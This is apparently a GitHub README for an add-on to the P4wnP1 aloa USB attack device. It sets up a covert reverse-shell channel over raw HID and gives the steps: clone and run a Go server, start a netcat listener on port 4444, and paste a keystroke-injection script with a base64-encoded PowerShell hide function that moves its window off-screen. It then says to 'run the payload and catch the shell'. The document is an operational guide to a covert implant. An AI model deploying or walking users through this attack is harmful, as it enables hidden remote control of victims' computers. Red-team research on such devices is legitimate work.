# Intro  
This is an alternative to the built-in covert channel option for the P4wnP1 aloa (https://github.com/RoganDawes/P4wnP1_aloa)  
that goes over a raw HID and USB rather than WiFi.  

Since @RoganDawes version was lacking a bit of documentation and the hide function was not working at all, I implemented a new way of doing this.  
The function itself, which is base64 decoded in the helper.js now can be found in the hide.ps1 file. If you don't trust me, and you probably shouldn't, then you can base64 decode it yourself:  
```
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content -Raw -Path .\hide.ps1)))| Set-Content .\encoded.txt
```

# How to use  
It is crucial that you have the RAW HID function active. Otherwise this won't work:  

![image](https://github.com/user-attachments/assets/f01ceb8b-fc33-4513-8800-1b5d36d7a12f)


## Copy the server folder onto the P4wnP1 (ssh, scp, git, wget whatever)  
```
git clone https://github.com/LuemmelSec/CovertChannel
```

## Run the server  
```
go run server.go
```
![image](https://github.com/user-attachments/assets/3d789442-a3c4-4326-825b-7d8a657edcd0)

## Setup a listener to catch the reverseshell on the P4wnP1
```
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/e2cd715a-5fda-4765-9e83-e854ab1eccaf)

## Execute the script
Copy the content of the ``helper.js`` into the ``HIDSCRIPT```section of your P4wnP1  
![image](https://github.com/user-attachments/assets/f08e6738-11c9-4de0-b6dc-f970aab16b91)

Adjust all the settings to your needs. The way it defaults to is movin the ISE out of view with X -2000 and Y -2000  
Change the keyboard layout !!!  

Last but not least: Run the payload and catch the shell.
